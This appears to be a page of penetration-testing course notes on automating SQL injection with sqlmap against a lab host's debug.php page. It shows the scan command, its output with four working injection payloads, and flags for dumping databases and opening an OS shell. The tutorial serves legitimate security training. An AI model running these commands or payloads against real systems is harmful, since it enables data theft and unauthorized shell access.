---
description: Tools and techniques to make finding and examining SQLi vulnerabilities easier
---

# Automating SQLi

The SQLi process can be automated via several tools (often preinstalled on Kali).

The examples will build on the SQLi examples from previous sections.

## sqlmap

Can be used to identify and exploit SQL injection vulnerabilities against various database engines.

The application's [user manual](https://github.com/sqlmapproject/sqlmap/wiki) provides full details around usage.

### Example

Using e to examine the `/debug.php` page from earlier examples and exercises:

```bash
sqlmap -u http://192.168.197.10/debug.php?id=1 -p "id"
```

This will result in the identification of a successful injection point:

```
sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 2414=2414

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 2810 FROM(SELECT COUNT(*),CONCAT(0x7171767671,(SELECT (ELT(2810=2810,1))),0x716b766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4882 FROM (SELECT(SLEEP(5)))oNvZ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7171767671,0x6266764b646657786f6e46644a694c5a6457775743436664764c725343477973656a474954584275,0x716b766271),NULL-- -
---
[15:13:57] [INFO] the back-end DBMS is MySQL
web server operating system: Windows
web application technology: Apache 2.4.33, PHP 7.2.4
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
```

Once a valid injection point is determined it is possible to dump the database via the `--dump` flag. In some cases, it is even possible to gain a shell directly in sqlmap via the `--os-shell` flag.
